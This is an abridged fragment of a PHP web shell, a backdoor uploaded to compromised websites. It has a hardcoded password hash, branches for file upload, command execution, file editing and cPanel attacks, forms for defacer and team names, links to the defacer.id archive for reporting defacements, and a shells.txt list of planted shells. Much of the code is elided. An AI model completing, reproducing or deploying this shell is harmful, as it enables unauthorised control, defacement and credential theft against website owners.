...
$auth_pass = "644ba2c17e79f987c58ca737bdee8929";
$color = "#00ff00";
...
<center>
<header>
<img src="https://i.warosu.org/data/g/img/0476/75/1429906646580.gif"/>
<br>
 <br>
<form method="post">
...
if($_GET['do'] == 'upload') {
 ...
 elseif($_GET['do'] == 'cmd') {
	...
	function edit_file($file,$index){
		...
		echo "<Span style='color:red;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
		} 
		else {
...
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='hekel' size='50' value='Monkey B Luffy'><br>
		<u>Team</u>: <br>
...
$tim = $_POST['tim'];
if($go) {
	echo "<a href='https://www.defacer.id/archive.html' target='blank'>Archive</a> - ";
	echo "<a href='https://www.defacer.id/special.html' target='blank'>Special Archive</a> - ";
	echo "<a href='https://www.defacer.id/onhold.html' target='blank'>Onhold Archive</a><br><br>";
...
echo "Shell [ <a href='./shells.txt' target='_blank'>shells.txt</a> ]</span>";
 ...
 elseif($_GET['do'] == 'cpanel') {
	...
	if($_POST['submit']) {
		...
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='Monkey B Luffy'><br>
		<u>Domains</u>: <br>
